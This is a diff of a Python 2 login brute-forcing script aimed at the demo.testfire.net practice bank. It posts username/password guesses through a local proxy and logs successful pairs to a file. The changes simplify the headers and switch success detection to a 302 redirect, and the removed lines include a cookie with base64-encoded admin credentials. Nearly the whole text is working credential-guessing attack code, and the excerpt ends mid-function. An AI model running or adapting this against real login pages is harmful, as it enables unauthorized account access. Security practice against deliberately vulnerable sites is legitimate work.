@@ -1,30 +1,20 @@
 # -*- coding: utf-8 -*-
-import urllib2
 import urllib
 import httplib
-import requests
 import re
 
-headers = {"Host": "demo.testfire.net",
-           "Connection": "keep-alive",
-           "Cache-Control": "max-age=0",
-           "Origin": "http://demo.testfire.net",
-           "Upgrade-Insecure-Requests": "1",
-           "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36",
+headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded",
-           "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
-           "Referer": "http://demo.testfire.net/bank/login.aspx",
-           "Accept-Encoding": "gzip, deflate",
-           "Accept-Language": "zh-CN,zh;q=0.8,en;q=0.6",
-           "Cookie": "ASP.NET_SessionId=j2ac00552nqcaz455zccx3ms; amSessionId=112127775897; amUserInfo=UserName=YWRtaW4=&Password=YWRtaW4=; amUserId=1"}
+           "Referer": "http://demo.testfire.net/bank/login.aspx"}
 def brute_force(user, password):
 
     conn = httplib.HTTPConnection("localhost","8080")  # 代理
-    params = urllib.urlencode({'uid': user, 'passw': password,'btnSubmit':'Login'})
-    conn.request("POST", "http://demo.testfire.net/bank/login.aspx", params, headers=headers)  # 后台路径
-    responseText = conn.getresponse().read()
-    TXT = re.search("Login Failed:",responseText)
-    if TXT is None:
+    data = {'uid': user, 'passw': password,'btnSubmit':'Login'}
+    params = urllib.urlencode(data)
+    page = conn.request("POST", "http://demo.testfire.net/bank/login.aspx", params, headers=headers)  # request页面
+    response = conn.getresponse()#返回的页面
+    status = response.status
+    if status==302:
         print '---- find user:', user, ' with password:',password, '-----'+'\n'
         outFile.write(user + ':' + password + '\n')
     else:
